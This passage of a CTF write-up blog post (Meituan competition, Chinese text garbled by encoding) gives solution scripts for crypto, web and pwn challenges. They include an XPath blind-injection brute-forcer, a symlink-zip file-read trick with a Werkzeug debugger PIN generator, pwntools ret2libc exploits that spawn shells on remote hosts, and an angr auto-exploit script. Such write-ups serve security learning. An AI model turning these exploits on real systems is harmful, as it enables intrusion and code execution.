<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def my_poly(coe,x):</span><br><span class="line">	<span class="attribute">res</span>=0</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,513):</span><br><span class="line">		res+=coe[i-1]*(x^i)</span><br><span class="line">	return res</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">flag1 = b<span class="string">&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span></span><br><span class="line">k = bytes_to_long(flag1)</span><br><span class="line">exec(open(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line">R.&lt;a,t&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"><span class="attribute">s1</span>=gift[0][0]</span><br><span class="line"><span class="attribute">coe1</span>=gift[0][1:]</span><br><span class="line"><span class="attribute">s2</span>=gift[1][0]</span><br><span class="line"><span class="attribute">coe2</span>=gift[1][1:]</span><br><span class="line"><span class="attribute">f1</span>=my_poly(coe1,a)+s1</span><br><span class="line"><span class="attribute">f2</span>=my_poly(coe2,t)+s2</span><br><span class="line"></span><br><span class="line"><span class="attribute">res</span>=Ideal([f1,f2,t-k<span class="number">*a</span>]).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">res=[ x.constant_coefficient() <span class="keyword">for</span> x <span class="keyword">in</span> res]</span><br><span class="line">a,t,<span class="attribute">p</span>=list(map(int,res))</span><br><span class="line"><span class="built_in">print</span>(a,t,p)</span><br><span class="line"><span class="attribute">q</span>=n//p</span><br><span class="line"><span class="attribute">d</span>=inverse(e,(p-1)*(q-1))</span><br><span class="line"><span class="attribute">m</span>=pow(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(int(m)))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;e6d7511d75bd537e1bd0cd08abea415f5f27d6cf&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="web"><a class="markdownIt-Anchor" href="#web"></a> <strong>Web</strong></h3>
<h4 id="babyjava"><a class="markdownIt-Anchor" href="#babyjava"></a> <strong>babyjava</strong></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze39yqy7j0c006fv94i.cloudeci1.ichunqiu.com:8888/hello&quot;</span></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;-@!&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">payload1=<span class="string">&quot;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload2=<span class="string">&quot;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload3=<span class="string">&quot;&#x27;or substring(name(/root/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span> <span class="comment">#username username</span></span><br><span class="line"><span class="comment">#&#x27;or string-length(name(/root/user/username[2]))=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;</span></span><br><span class="line">payload4=<span class="string">&quot;&#x27;or substring(/root/user/username[2]/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        data=&#123;<span class="string">&quot;xpath&quot;</span>:payload4.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;This information is not available&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&quot;!&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># if &quot;This information is not available&quot; in r.text:</span></span><br><span class="line">        <span class="comment">#     print(flag)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
<p>xpathæ³¨å…¥ï¼Œflagåœ¨userçš„ç¬¬äºŒä¸ªusernameé‡Œ</p>
<p><img src="/2022/09/MT-CTF-Writeup/Yhut2UBDdjhU1HRdsrIkJQ.png" alt="3"></p>
<h4 id="onlineuzip"><a class="markdownIt-Anchor" href="#onlineuzip"></a> <strong>OnlineUzip</strong></h4>
<p>æ–‡ä»¶ä¸Šä¼ å­˜åœ¨è½¯é“¾æ¥ä»»æ„æ–‡ä»¶è¯»å–</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">ln -s / <span class="keyword">test</span></span><br><span class="line"><span class="keyword">zip</span> -y <span class="keyword">test</span>.<span class="keyword">zip</span> <span class="keyword">test</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/MT-CTF-Writeup/MqA7vFiNYqVxVBxCUaSVOg.png" alt="4"></p>
<p>flagæ–‡ä»¶æ²¡æœ‰æƒé™ï¼Œä½†æ˜¯æŠ¥é”™äº†ï¼Œå°è¯•å»è¿˜åŸpin</p>
<p><img src="/2022/09/MT-CTF-Writeup/vK2D2uEAIPF8eUlvvjO1Ww.png" alt="5"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;95530260679&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c8962029821f34fdecf5402e3da60b23c2cfc8a0b98c91124624fa89bfc7f4950ef9f5&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿›å…¥ç›´æ¥æ‰§è¡Œpythonå‘½ä»¤è¯»å–flag</p>
<p><img src="/2022/09/MT-CTF-Writeup/NIj_m3ePomvNmqnedYKJqw.png" alt="6"></p>
<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> <strong>PWN</strong></h3>
<h4 id="note"><a class="markdownIt-Anchor" href="#note"></a> <strong>note</strong></h4>
<p>editå­˜åœ¨è¶Šç•Œç¼–è¾‘ï¼Œå¯ä»¥ç›´æ¥ret2libcã€‚</p>
<p><img src="/2022/09/MT-CTF-Writeup/9GVF4sWsMZTpZTzVsU4WCA.png" alt="7"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">r</span>=process(&quot;/home/ubuntu/pwn/æ¯”èµ›/MTCTF/note/note&quot;)</span><br><span class="line"><span class="attribute">r</span>=remote(&quot;39.106.78.22&quot;,35482)</span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;/home/ubuntu/pwn/æ¯”èµ›/MTCTF/note/note&quot;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;amd64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;5. leave&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="attribute">puts_plt</span>=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="attribute">puts_got</span>=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = 0x401150</span><br><span class="line">pop_rdi_ret = 0x00000000004017b3</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line"><span class="built_in">add</span>(0x100,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span><span class="number">*8</span> + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line"><span class="built_in">edit</span>(-4,payload)</span><br><span class="line"><span class="attribute">libc_base</span>=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b<span class="string">&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+libc.search(b<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span><span class="number">*8</span> + p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+p64(system_addr)+p64(start_addr)</span><br><span class="line"><span class="built_in">edit</span>(-4,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="ret2libc_aarch64"><a class="markdownIt-Anchor" href="#ret2libc_aarch64"></a> <strong>ret2libc_aarch64</strong></h4>
<p>å¼‚æ„pwnï¼Œå¯ä»¥ç›´æ¥æ³„éœ²å‡ºlibcæ•°æ®ï¼Œç„¶åç›´æ¥æ ¹æ®aarch64çš„è°ƒç”¨è§„åˆ™ï¼Œè°ƒç”¨system(â€œ/bin/shâ€)ã€‚</p>
<p><img src="/2022/09/MT-CTF-Writeup/K5J0v8JuNuVU0KNm3B0IGA.png" alt="8"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;aarch64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = 2</span><br><span class="line"><span class="keyword">if</span> local == 0:</span><br><span class="line">    <span class="attribute">r</span>=process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> local == 1:</span><br><span class="line">    <span class="attribute">r</span>=process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="attribute">r</span>=remote(&quot;39.106.78.22&quot;,16078)</span><br><span class="line"></span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/ubuntu/pwn/arm_pwn/pwn/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">meau(1)</span><br><span class="line"><span class="attribute">setbuf_got</span>=elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">r.send(p64(setbuf_got))</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(b<span class="string">&quot;\n&quot;</span>)[:-1].ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;setbuf&#x27;</span>] + 0x4000000000</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+hex(libc_base))</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">bin_sh = libc_base + libc.search(b<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">meau(2)</span><br><span class="line"><span class="attribute">payload</span>=b&#x27;a&#x27;*0x88+p64(libc_base+0x0000000000063e5c)+p64(system_addr)*5+p64(bin_sh)+p64(system_addr)*5</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="æ‰è¿·è—"><a class="markdownIt-Anchor" href="#æ‰è¿·è—"></a> <strong>æ‰è¿·è—</strong></h4>
<p>å°±æ˜¯æŠŠSCTFçš„ä¸€é“è‡ªåŠ¨åŒ–é¢˜ç›®çš„ä¸€ç§æƒ…å†µæ‹¿äº†è¿‡æ¥ï¼Œä¹‹å‰çš„è„šæœ¬æ”¹æ”¹å°±èƒ½ç›´æ¥æ‰“ã€‚</p>
<p><img src="/2022/09/MT-CTF-Writeup/LINGgj13umO_LKwO4910kQ.png" alt="9"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">from</span> angr.sim_options <span class="keyword">import</span> LAZY_SOLVES</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">from</span> angr.sim_options <span class="keyword">import</span> ZERO_FILL_UNCONSTRAINED_MEMORY, unicorn</span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> Project, SimProcedure</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NopsFun</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">out_list = []</span><br><span class="line">g_idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fksth</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, a1, a2</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;fksth&#x27;</span>)</span><br><span class="line">        constraints = []</span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            v = self.state.memory.load(a2+idx, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.state.solver.<span class="built_in">eval</span>(v) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            constraints.append(v == self.state.memory.load(a1+idx, <span class="number">1</span>))</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        retval = claripy.If(self.state.solver.And(*constraints), claripy.BVV(<span class="number">0</span>, <span class="number">64</span>), claripy.BVV(<span class="number">1</span>, <span class="number">64</span>))</span><br><span class="line">        <span class="keyword">return</span> retval</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">input_val</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> g_idx</span><br><span class="line">        data1 = claripy.BVS(<span class="string">&#x27;input%x&#x27;</span> %g_idx, <span class="number">32</span>)</span><br><span class="line">        data2 = claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">        ret = self.state.solver.Concat(data2, data1)</span><br><span class="line">        out_list.append((g_idx, <span class="string">&#x27;int&#x27;</span>, data1))</span><br><span class="line">        g_idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">input_line</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buff, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="keyword">global</span> g_idx</span><br><span class="line">        <span class="built_in">len</span>= self.state.solver.<span class="built_in">eval</span>(<span class="built_in">len</span>)</span><br><span class="line">        data = claripy.BVS(<span class="string">&#x27;input%x&#x27;</span> %g_idx, <span class="built_in">len</span>* <span class="number">8</span>)</span><br><span class="line">        out_list.append((g_idx, <span class="string">&#x27;str&#x27;</span>, data))</span><br><span class="line">        g_idx += <span class="number">1</span></span><br><span class="line">        self.state.memory.store(buff, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aeg</span>(<span class="params">binary</span>):</span><br><span class="line">    p = angr.Project(binary, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>, <span class="string">&#x27;load_debug_info&#x27;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="keyword">for</span> symbol <span class="keyword">in</span> p.loader.symbols:</span><br><span class="line">        <span class="comment">#print (symbol.name)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;main&#x27;</span> == symbol.name:</span><br><span class="line">            main_addr = symbol.rebased_addr</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;main=%x\n&#x27;</span> %main_addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;fksth&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            fksth_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;init&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            init_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;input_line&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            input_line_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;input_val&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            input_val_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;backdoor&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            backdoor_addr = symbol.rebased_addr</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;symbol=%s, addr=%x&#x27;</span> %(symbol.name, symbol.rebased_addr))</span><br><span class="line"></span><br><span class="line">    cfg = p.analyses.CFGFast()</span><br><span class="line">    main_func = cfg.kb.functions[main_addr]</span><br><span class="line">    main_block_addrs = main_func.block_addrs</span><br><span class="line">    </span><br><span class="line">    max_disp = -<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> call_site <span class="keyword">in</span> main_func.get_call_sites():</span><br><span class="line">        target = main_func.get_call_target(call_site)</span><br><span class="line">        <span class="keyword">if</span> target == input_line_addr:</span><br><span class="line">            <span class="comment">#æ‹¿å‡ºå¯¹åº”çš„input_lineä»£ç å—</span></span><br><span class="line">            block = p.factory.block(call_site).capstone</span><br><span class="line">            <span class="keyword">for</span> insn <span class="keyword">in</span> block.insns:</span><br><span class="line">                <span class="built_in">print</span> (insn)</span><br><span class="line">                <span class="keyword">if</span> insn.mnemonic == <span class="string">&#x27;lea&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> insn.disp &gt; max_disp:</span><br><span class="line">                        max_disp = insn.disp</span><br><span class="line">                        vul_addr = call_site</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (max_disp)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;addr=%x&#x27;</span> %vul_addr)</span><br><span class="line">    graph = main_func.transition_graph</span><br><span class="line">    <span class="keyword">for</span> block_node <span class="keyword">in</span> graph.nodes:</span><br><span class="line">        <span class="keyword">if</span> (block_node.addr &lt;= vul_addr) &amp; (vul_addr &lt; (block_node.addr+block_node.size)):</span><br><span class="line">            vul_block = block_node</span><br><span class="line">    cur_block = vul_block</span><br><span class="line"></span><br><span class="line">    path = [cur_block.addr]</span><br><span class="line">    <span class="keyword">while</span> cur_block.addr != main_addr:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> graph.predecessors(cur_block):</span><br><span class="line">            cur_block = key</span><br><span class="line">            path = [cur_block.addr] + path</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    void_addrs = []</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> graph.nodes:</span><br><span class="line">        <span class="keyword">if</span> node.addr <span class="keyword">not</span> <span class="keyword">in</span> path:</span><br><span class="line">            <span class="keyword">if</span> node.addr <span class="keyword">in</span> main_block_addrs:</span><br><span class="line">                void_addrs.append(node.addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;-&#x27;</span>.join(<span class="string">&#x27;0x%x&#x27;</span> %p <span class="keyword">for</span> p <span class="keyword">in</span> path))</span><br><span class="line">        </span><br><span class="line">    state = p.factory.blank_state(addr=main_addr, add_options=&#123;LAZY_SOLVES&#125;)</span><br><span class="line">    state.options.add(ZERO_FILL_UNCONSTRAINED_MEMORY)</span><br><span class="line">    state.options.add(LAZY_SOLVES)</span><br><span class="line">    simgr = p.factory.simgr(state)</span><br><span class="line">    print_plt = p.loader.main_object.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    p.hook(print_plt, NopsFun())</span><br><span class="line">    p.hook(fksth_addr, fksth())</span><br><span class="line">    p.hook(init_addr, NopsFun())</span><br><span class="line">    p.hook(input_line_addr, input_line())</span><br><span class="line">    p.hook(input_val_addr, input_val())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_state</span>(<span class="params">simgr</span>):</span><br><span class="line">        <span class="keyword">for</span> state <span class="keyword">in</span> simgr.active:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;pc=%s&#x27;</span> %state.regs.pc)</span><br><span class="line">            <span class="keyword">if</span> state.solver.<span class="built_in">eval</span>(state.regs.pc) <span class="keyword">in</span> void_addrs:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;remove&#x27;</span>)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;active&#x27;</span>].remove(state)</span><br><span class="line">            <span class="keyword">if</span> state.solver.<span class="built_in">eval</span>(state.regs.pc) == vul_block.addr:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;found&#x27;</span>)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;found&#x27;</span>].append(state)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;active&#x27;</span>].remove(state)</span><br><span class="line">        <span class="keyword">return</span> simgr</span><br><span class="line"></span><br><span class="line">    simgr.explore(step_func=log_state)</span><br><span class="line">    state = simgr.stashes[<span class="string">&#x27;found&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (idx, <span class="built_in">type</span>, data) <span class="keyword">in</span> out_list:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;int&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%x: %s&#x27;</span> %(idx, state.solver.<span class="built_in">eval</span>(data)))</span><br><span class="line">            s += <span class="string">b&#x27;%d &#x27;</span> %(state.solver.<span class="built_in">eval</span>(data))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%x: %s&#x27;</span> %(idx, state.solver.<span class="built_in">eval</span>(data, cast_to=<span class="built_in">bytes</span>)))</span><br><span class="line">            s += state.solver.<span class="built_in">eval</span>(data, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        </span><br><span class="line">    s += (-max_disp + <span class="number">8</span>)*<span class="string">b&#x27;a&#x27;</span> + p64(backdoor_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;back_door = &quot;</span> + <span class="built_in">hex</span>(backdoor_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-max_disp = &quot;</span> + <span class="built_in">hex</span>(-max_disp))</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;39.106.76.68&quot;</span>,<span class="number">44064</span>)</span><br><span class="line">r.sendline(aeg(<span class="string">&quot;./pwn&quot;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="mininep1ç¾å›¢å†³èµ›ctfwriteup"><a class="markdownIt-Anchor" href="#mininep1ç¾å›¢å†³èµ›ctfwriteup"></a> <strong>Mininep1â€“ç¾å›¢å†³èµ›CTFâ€“Writeup</strong></h1>
<h2 id="ä¸€-æˆ˜é˜Ÿä¿¡æ¯"><a class="markdownIt-Anchor" href="#ä¸€-æˆ˜é˜Ÿä¿¡æ¯"></a> <strong>ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯</strong></h2>
<p>æˆ˜é˜Ÿåç§°ï¼šMininep1-1</p>
<p>ä¸ªäººæ’åï¼š4</p>
